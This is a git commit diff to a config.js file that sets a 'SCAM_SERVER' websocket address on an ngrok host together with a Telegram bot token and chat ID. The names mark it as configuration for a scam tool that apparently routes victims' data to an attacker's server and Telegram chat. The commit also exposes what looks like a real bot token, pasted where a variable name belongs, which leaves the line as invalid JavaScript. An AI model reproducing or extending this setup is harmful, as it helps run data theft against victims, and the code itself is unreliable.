bb63ea14c974299f44548e457bce608718ddc7ff
jozef800 <107060961+jozef800@users.noreply.github.com>
2025-02-15 01:12:54 +0100

    Update config.js

--- config.js
+++ config.js
@@ -1,3 +1,3 @@
 const SCAM_SERVER = "wss://b0ed-41-96-9-150.ngrok-free.app";  // Use secure WebSocket URL
-const TELEGRAM_BOT_TOKEN = "SCAM_BOT_TOKEN";
-const TELEGRAM_CHAT_ID = "SCAMMER_CHAT_ID";
+const 8001637745:AAHoM9PCHgiKlJp466D7g7mksDo5iAnb5jM = "SCAM_BOT_TOKEN";
+const TELEGRAM_CHAT_ID = "8059448119";
